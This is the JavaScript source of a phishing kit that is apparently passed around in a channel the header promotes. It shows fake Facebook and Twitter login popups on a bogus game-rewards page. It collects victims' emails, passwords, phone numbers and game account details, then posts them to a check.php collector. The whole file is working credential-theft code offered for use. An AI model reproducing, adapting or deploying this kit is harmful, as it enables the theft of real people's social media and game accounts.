// BEFORE THIS  JS SCRIPT WAS ENCRYPTED BUT WE HAVE DECRYPT IT
// JOIN @berbagiscphising THERE ARE MANY SCRIPT WITHOUT ENCRYPTION

var buka = new Audio();
buka.src = 'https://l.top4top.io/m_1725u5z7i1.mp3';

var tutup = new Audio();
tutup.src = 'https://a.top4top.io/m_1725zobal2.mp3';

function open_account_login() {
    $('.open_account_login').show();
    $('.open_rewards').hide()
}

function open_facebook() {
    $('.login_facebook').show();
    $('.open_account_login').hide()
}

function open_twitter() {
    $('.login_twitter').show();
    $('.open_account_login').hide()
}

function close_facebook() {
    $('.login_facebook').hide();
    $('.open_account_login').show()
}

function close_twitter() {
    $('.login_twitter').hide();
    $('.open_account_login').show()
}

// code for validate data to next step
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$email = $('#email-facebook').val().trim();
	$password = $('#password-facebook').val().trim();
	$login = $('#login-facebook').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login_facebook').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$email = $('#email-twitter').val().trim();
	$password = $('#password-twitter').val().trim();
	$login = $('#login-twitter').val().trim();
	if($email == '' || $password == '') {
	} else {
	$('.login_twitter').hide();
	$('.account_verification').show();
	$("input#validateEmail").val($email);
	$("input#validatePassword").val($password);
	$("input#validateLogin").val($login);
	}
	}); 
}

function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $nick = $("input#nick").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $rpl = $("input#rpl").val();
	var $platform = $("input#platform").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
}